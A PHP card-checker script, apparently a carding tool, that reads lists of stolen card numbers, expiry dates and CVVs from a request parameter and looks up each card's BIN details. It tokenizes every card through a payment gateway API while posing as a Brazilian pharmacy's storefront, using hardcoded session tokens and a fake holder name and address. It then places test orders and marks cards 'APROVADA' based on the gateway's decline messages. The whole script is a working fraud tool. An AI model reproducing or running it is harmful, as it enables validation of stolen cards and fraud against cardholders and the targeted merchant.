<?php





// api by @korekiyoccs

error_reporting(0);

if (file_exists("wrlindotlb.txt")!== false) {unlink("wrlindotlb.txt");fopen("wrlindotlb.txt", 'w+');fclose("wrlindotlb.txt");}else{fopen("wrlindotlb.txt", 'w+');fclose("wrlindotlb.txt");}

function multiexplode($delimiters, $string) {
 $one = str_replace($delimiters, $delimiters[0], $string);
 $two = explode($delimiters[0], $one);
 return $two;
}
function getStr($string, $start, $end) {
  $str = explode($start, $string);
  $str = explode($end, $str[1]);  
  return $str[0];
}
function replace_unicode_escape_sequence($match) { return mb_convert_encoding(pack('H*', $match[1]), 'UTF-8', 'UCS-2BE'); }
function unicode_decode($str) { return preg_replace_callback('/\\\\u([0-9a-f]{4})/i', 'replace_unicode_escape_sequence', $str); }
$delemitador = array("|", ";", ":", "/", "»", "«", ">", "<");
$lista = $_GET['lista'];
$cc = multiexplode($delemitador, $lista)[0];
$bin = substr($cc, 0, 2);
$time = time();
$mes = multiexplode($delemitador, $lista)[1];
$ano = multiexplode($delemitador, $lista)[2];
$cvv = multiexplode($delemitador, $lista)[3];

list($cc, $mes, $ano, $cvv) = explode('|', $_REQUEST['lista']);

    if($cc[0] == 0){
        $bandeira = 4;
    }elseif($cc[0] == 0){
        $bandeira = 2;
    }elseif(substr($cc, 0, 4) == 5067){
        $bandeira = 9;
    }elseif(substr($cc, 0, 2) == 63){
    }elseif(substr($cc, 0, 2) == 65){
        $bandeira = 9;
    }elseif($cc[0] == 0){
        $bandeira = 4;
    }elseif($cc[0] == 0){
        $bandeira = 9;
    }else{
      echo "<font color='red'>Erro $cc|$mes|$ano|BIN NÃO ACEITA !!!@korekiyoccs </br>";
        exit;
    }
    
 switch ($ano) { 
         case '2018':$mes = '18';break; 
         case '2019':$ano = '19';break; 
         case '2020':$ano = '20';break; 
         case '2021':$ano = '21';break; 
         case '2022':$ano = '22';break; 
         case '2023':$ano = '23';break; 
         case '2024':$ano = '24';break; 
         case '2025':$ano = '25';break; 
         case '2026':$ano = '26';break; 
         case '2027':$ano = '27';break; 
         case '2028':$ano = '28';break; 
}

function getStr2($string, $start, $end) {
	$str = explode($start, $string);
	$str = explode($end, $str[1]);
	return $str[0];
}

function dadosnome() {
	$nome = file("lista_nomes.txt");
	$mynome = rand(0, sizeof($nome)-1);
	$nome = $nome[$mynome];
	return $nome;
}
function dadossobre() {
	$sobrenome = file("lista_sobrenomes.txt");
	$mysobrenome = rand(0, sizeof($sobrenome)-1);
	$sobrenome = $sobrenome[$mysobrenome];
	return $sobrenome;

}

function ano12() {
	switch ($ano) {
		case '20': $ano = '2020'; break;
		case '21': $ano = '2021'; break;
		case '22': $ano = '2022'; break;
		case '23': $ano = '2023'; break;
		case '24': $ano = '2024'; break;
		case '25': $ano = '2025'; break;
		case '26': $ano = '2026'; break;
		case '27': $ano = '2027'; break;
		case '28': $ano = '2028'; break;
		case '29': $ano = '2029'; break;
	}}
function mes12() {
	switch ($mes) {
		case '1': $mes = '01'; break;
		case '2': $mes = '02'; break;
		case '3': $mes = '03'; break;
		case '4': $mes = '04'; break;
		case '5': $mes = '05'; break;
		case '6': $mes = '06'; break;
		case '7': $mes = '07'; break;
		case '8': $mes = '08'; break;
		case '9': $mes = '09'; break;
		case '10': $mes = '10'; break;
		case '11': $mes = '11'; break;
		case '12': $mes = '12'; break;
	}}

$mes13 = mes12();
$ano13 = ano12();
/*Korekiyo BaseForever/*/

$bin = substr($cc, 0, 6); 

$file = 'bins.csv'; 

$searchfor = $bin; 
$contents = file_get_contents($file); 
$pattern = preg_quote($searchfor, '/'); 
$pattern = "/^.*$pattern.*\$/m"; 
if (preg_match_all($pattern, $contents, $matches)) { 
  $encontrada = implode("\n", $matches[0]); 
} 
$pieces = explode(";", $encontrada); 
$c = count($pieces); 
if ($c == 8) { 
  $pais = $pieces[4]; 
  $paiscode = $pieces[5]; 
  $banco = $pieces[2]; 
  $level = $pieces[3]; 
  $bandeira = $pieces[1]; 
}else { 
  $pais = $pieces[5]; 
  $paiscode = $pieces[6]; 
  $level = $pieces[4]; 
  $banco = $pieces[2]; 
  $bandeira = $pieces[1]; 
} 
 
$bin_result = "$bandeira $banco $level $pais";
 
 //POST/GET/PUT
if ((empty($cc)) || (empty($mes)) || (empty($ano)) || (empty($cvv))) {
	exit('<span class="badge badge-danger"><img src="https://images.vexels.com/media/users/3/153978/isolated/preview/483ef8b10a46e28d02293a31570c8c56-iacute-cone-de-tra-ccedil-o-colorido-do-sinal-de-aviso-by-vexels.png" class="rounded-" width="25"</span>ERRO </span><font> '.$lista.' </font> <span class="badge badge-danger"> POR FAVOR INSIRA UMA LISTA VALIDA </span> <font> @korekiyoccs </font><br>');
}else{

//////////////////////////////////////////////////////////////////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.mundipagg.com/core/v1/tokens?appId=pk_kNMezPks1SABrwWK");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/wrlindotlb.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/wrlindotlb.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: */*',
'Accept-Encoding: gzip, deflate, br',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'Content-Type: application/json; charset=UTF-8',
'Host: api.mundipagg.com',
'Origin: https://www.drogasil.com.br',
'Referer: https://www.drogasil.com.br/',
'User-Agent: Mozilla/5.0 (Linux; Android 10; moto g(7) play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"type":"card","card":{"type":"credcard","number":"'.$cc.'","brand":"Elo","holder_name":"CAIO DE SOUZA","exp_month":"'.$mes.'","exp_year":"20'.$ano.'","cvv":"000","installments":"1","save":false,"billing_address":{"street":"QR 502 Conjunto 4","number":"37","zip_code":"72310404","neighborhood":"Samambaia Sul (Samambaia) - undefined","city":"Brasília","state":"DF","country":"BR"}}}'); 

$end = curl_exec($ch);
$token = getStr($end, '"id": "','"');
$ultimosdigitos = getStr($end, '"last_four_digits": "','"');

curl_setopt($ch, CURLOPT_URL, "https://site-bff-prod.drogasil.com.br/graphql");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/wrlindotlb.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/wrlindotlb.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: */*',
'Accept-Encoding: gzip, deflate, br',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'Content-Type: application/json',
'Cookie: ',
'Host: site-bff-prod.drogasil.com.br',
'Origin: https://www.drogasil.com.br',
'x-session-token-cart: 9g3QyQZxwkMQNZw4BjjZzv6Limpc1Nuu',
'x-session-customer: ml0i5xv6a36rjmc22w5bew85sonymzcc',
'Referer: https://www.drogasil.com.br/',
'User-Agent: Mozilla/5.0 (Linux; Android 10; moto g(7) play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"operationName":"placeOrder","variables":{"fingerPrint":"c2f0314f5a6661d884ecfa2819ef0fbb","telephone":"61999575261","universDebit":false,"method":"mundipagg_creditcard","additionalData":{"cc_type":"Elo","cc_last_4":"'.$ultimosdigitos.'","cc_exp_year":"20'.$ano.'","cc_exp_month":"'.$mes.'","cc_owner":"CAIO DE SOUZA","cc_save_card":0,"cc_installments":"1","cc_token_credit_card":"'.$token.'","cc_cvv":"000"}},"query":"mutation placeOrder($fingerPrint: String!, $telephone: String!, $universDebit: Boolean, $method: String!, $additionalData: PaymentInformationAdditionalDataInput) {\n  placeOrder(\n    input: {fingerPrint: $fingerPrint, telephone: $telephone, universDebit: $universDebit, paymentMethod: {method: $method, additional_data: $additionalData}}\n  ) {\n    increment_id\n    grand_total\n    customer_id\n    customer_email\n    created_at\n    items {\n      name\n      price\n      __typename\n    }\n    __typename\n  }\n}\n"}'); 
$wr = curl_exec($ch);

//echo $end;
//echo $wr;
$retorno = getStr($wr, '"message":"','"');
if (strpos($wr, 'Stone|Saldo insuficiente')!== false) {

exit('<img src="https://i.pinimg.com/originals/61/e1/e9/61e1e92d1cba837bba6f64f1a03a9b8e.png" class="rounded-circle" width="25"</span> <span class="badge badge-success"> #APROVADA </span><font> <font style="color: white">  ' . $cc . '|' . $mes . '|20' . $ano . '|'.$cvv.' '.$bandeira.' '.$banco.' '.$level.' '.$pais.' </font> <span class="<font style="color: red"> [ '.$retorno.' ] </span> <font> <font style="color: white"> </span>  @korekiyoccs [(' . (time() - $time) .  ' seg)]  </span><br>');
}

if (strpos($wr, 'GetNet|VERIFIQUE OS DADOS DO CARTAO [ECOM - 63]')!== false) {

exit('<img src="https://i.pinimg.com/originals/61/e1/e9/61e1e92d1cba837bba6f64f1a03a9b8e.png" class="rounded-circle" width="25"</span> <span class="badge badge-success"> #APROVADA </span><font> <font style="color: white">  ' . $cc . '|' . $mes . '|20' . $ano . '|'.$cvv.' '.$bandeira.' '.$banco.' '.$level.' '.$pais.' </font> <span class="<font style="color: red"> [ '.$retorno.' ] </span> <font> <font style="color: white"> </span>  @korekiyoccs [(' . (time() - $time) .  ' seg)]  </span><br>');
}else{
	exit('<img src="https://i.pinimg.com/originals/61/e1/e9/61e1e92d1cba837bba6f64f1a03a9b8e.png" class="rounded-circle" width="25"<span class="badge badge-danger" <font style="color: lime"></b></font><font style="color: red"><b>#Reprovada✖️</font> ' . $cc . '|' . $mes . '|20' . $ano . '|'.$cvv.' '.$bandeira.' '.$banco.' '.$level.' '.$pais.' | [ '.$retorno.' ] <font style="color: lime"></b></font><font style="color: green"><b> @korekiyoccs [ (' . (time() - $time) .  ' seg) ]</font><br>');
}}


?>